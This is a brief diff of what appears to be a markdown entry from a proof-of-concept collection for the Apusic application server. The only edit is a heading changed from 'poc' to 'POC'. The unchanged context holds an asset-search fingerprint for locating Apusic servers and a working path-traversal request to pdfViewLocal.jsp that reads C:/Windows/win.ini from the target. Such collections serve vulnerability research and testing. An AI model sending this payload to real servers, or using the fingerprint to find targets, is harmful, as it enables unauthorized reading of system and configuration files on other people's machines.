@@ -5,7 +5,7 @@
 app="Apusic应用服务器"
 ```
 
-## poc
+## POC
 ```
 /plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/win.ini
 ```
